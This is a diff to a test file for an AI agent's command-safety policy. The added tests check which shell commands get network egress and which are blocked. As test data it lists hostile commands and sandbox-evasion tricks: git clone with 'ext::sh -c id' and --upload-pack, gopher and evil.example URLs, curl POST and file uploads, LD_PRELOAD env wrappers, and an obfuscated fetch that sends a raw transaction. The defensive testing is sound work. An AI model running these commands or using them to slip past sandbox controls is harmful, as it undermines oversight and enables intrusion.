@@ -1,6 +1,6 @@
 import assert from "node:assert/strict";
 import test from "node:test";
-import { analyzeCommandSafety, analyzeReproductionCommandSafety, analyzeAgentBashCommandSafety, analyzeConfirmBashCommandSafety, isAgentBuildCommand, isAgentConfirmCommand } from "../dist/security/policy.js";
+import { analyzeCommandSafety, analyzeReproductionCommandSafety, analyzeAgentBashCommandSafety, analyzeConfirmBashCommandSafety, isAgentBuildCommand, isAgentConfirmCommand, openWorldCommandNeedsNetwork } from "../dist/security/policy.js";
 
 const cmd = (program, ...args) => ({ program, args });
 
@@ -117,6 +117,8 @@ test("destructive filesystem commands stay blocked even in network-enabled confi
     cmd("sed", "-i", "s/a/b/g", "contracts/Target.sol"),
     cmd("git", "-C", "sources/repo", "clean", "-fdx"),
     cmd("git", "-C", "sources/repo", "reset", "--hard"),
+    cmd("env", "FOO=bar", "rm", "-rf", "sources/tmp"),
+    cmd("env", "FOO=bar", "env", "BAR=baz", "rm", "-rf", "sources/tmp"),
   ]) {
     const decision = analyzeConfirmBashCommandSafety(c);
     assert.equal(decision.blocked, true, `${c.program} ${c.args.join(" ")} must be blocked`);
@@ -218,6 +220,78 @@ test("confirm-mode bash MAY fork and read live networks (the open-world differen
   }
   // run mode blocks a remote fork; confirm allows it — the capability difference is real.
   assert.equal(analyzeAgentBashCommandSafety(cmd("forge", "test", "--fork-url", "https://eth.llamarpc.com")).blocked, true);
+});
+
+test("open-world egress is granted per command instead of per phase", () => {
+  for (const c of [
+    cmd("forge", "test", "--fork-url", "https://eth.llamarpc.com"),
+    cmd("cast", "call", "--rpc-url", "https://mainnet.example", "0xabc", "balanceOf()"),
+    cmd("curl", "-fsSL", "https://example.com/spec.json"),
+    cmd("wget", "-q", "https://example.com/spec.json"),
+    cmd("git", "clone", "https://github.com/example/project"),
+    cmd("gh", "api", "repos/example/project"),
+    cmd("gh", "issue", "view", "123"),
+  ]) assert.equal(openWorldCommandNeedsNetwork(c, "inspect"), true, `${c.program} should receive read-only egress`);
+
+  for (const c of [
+    cmd("node", "repro.mjs"),
+    cmd("node", "-e", "fetch('https:'+'//mainnet.example',{method:'POST',body:'eth_'+'sendRawTransaction'})"),
+    cmd("curl", "-X", "POST", "https://mainnet.example", "--data", "{}"),
+    cmd("curl", "-XPOST", "https://mainnet.example"),
+    cmd("curl", "-sXPOST", "https://mainnet.example"),
+    cmd("curl", "-Tpayload.json", "https://mainnet.example"),
+    cmd("curl", "-sTpayload.json", "https://mainnet.example"),
+    cmd("curl", "-Ffile=@proof.json", "https://mainnet.example"),
+    cmd("curl", "--config", "poc/curl.conf", "https://mainnet.example"),
+    cmd("curl", "https://example.com", "gopher://victim.example:8545/_payload"),
+    cmd("curl", "--header", "X-HTTP-Method-Override: DELETE", "https://mainnet.example"),
+    cmd("curl", "--next", "https://mainnet.example"),
+    cmd("wget", "--config=poc/wgetrc", "https://mainnet.example"),
+    cmd("wget", "-epost_data=payload", "https://mainnet.example"),
+    cmd("wget", "-qepost_data=payload", "https://mainnet.example"),
+    cmd("wget", "--header=X-HTTP-Method-Override: DELETE", "https://mainnet.example"),
+    cmd("wget", "--input-file=poc/urls.txt", "https://mainnet.example"),
+    cmd("git", "clone", "ext::sh -c id"),
+    cmd("git", "clone", "--upload-pack=touch-pwned", "https://github.com/example/project"),
+    cmd("git", "clone", "-utouch-pwned", "https://github.com/example/project"),
+    cmd("git", "clone", "ssh://evil.example/project", "https://github.com/example/destination"),
+    cmd("git", "-C", "clone", "push", "https://example.com/repo"),
+    cmd("git", "--git-dir", "clone", "push", "https://example.com/repo"),
+    cmd("git", "clone", "--template=poc/template", "https://github.com/example/project"),
+    cmd("git", "push", "origin", "main"),
+    cmd("gh", "api", "repos/example/project/issues", "--method", "POST"),
+    cmd("gh", "api", "-XPOST", "repos/example/project/issues"),
+    cmd("gh", "api", "-iXPOST", "repos/example/project/issues"),
+    cmd("gh", "api", "repos/example/project/issues", "-ftitle=mutate"),
+    cmd("gh", "repo", "clone", "example/project", "--", "--upload-pack=touch-pwned"),
+    cmd("gh", "repo", "create", "clone", "--public"),
+    cmd("gh", "release", "create", "list", "--notes", "mutation"),
+    cmd("gh", "issue", "create", "--title", "list", "--body", "mutation"),
+    cmd("forge", "test", "--fork-url", "https://mainnet.example", "--ffi=true"),
+  ]) assert.equal(openWorldCommandNeedsNetwork(c, "inspect"), false, `${c.program} must remain network-sealed`);
+
+  assert.equal(openWorldCommandNeedsNetwork(cmd("npm", "install"), "build"), true);
+  assert.equal(openWorldCommandNeedsNetwork(cmd("npm", "test"), "confirm"), false);
+});
+
+test("env wrappers cannot alter the executable or sandbox settings behind an egress decision", () => {
+  for (const c of [
+    cmd("env", "PATH=.", "forge", "test", "--fork-url", "https://mainnet.example"),
+    cmd("env", "FOUNDRY_FFI=true", "forge", "test", "--fork-url", "https://mainnet.example"),
+    cmd("env", "CURL_HOME=poc", "curl", "https://mainnet.example"),
+    cmd("env", "LD_PRELOAD=poc/shim.so", "curl", "https://mainnet.example"),
+    cmd("env", "-u", "FOO", "curl", "https://mainnet.example"),
+  ]) {
+    assert.equal(analyzeConfirmBashCommandSafety(c).blocked, true, `${c.args[0]} must be rejected`);
+    assert.equal(analyzeAgentBashCommandSafety(c).blocked, true, `${c.args[0]} must be rejected in sealed agent mode too`);
+    assert.equal(openWorldCommandNeedsNetwork(c, "inspect"), false, `${c.args[0]} must not receive egress`);
+  }
+
+  // Harmless local wrappers remain usable, but never acquire open-world egress:
+  // the allowlisted executable must be launched directly for that capability.
+  const cacheWrapper = cmd("env", "SCARB_CACHE=./.scarb-cache", "scarb", "fetch");
+  assert.equal(analyzeConfirmBashCommandSafety(cacheWrapper).blocked, false);
+  assert.equal(openWorldCommandNeedsNetwork(cacheWrapper, "build"), false);
 });
 
 test("confirm-mode bash cannot smuggle remote URLs into generated test files", () => {
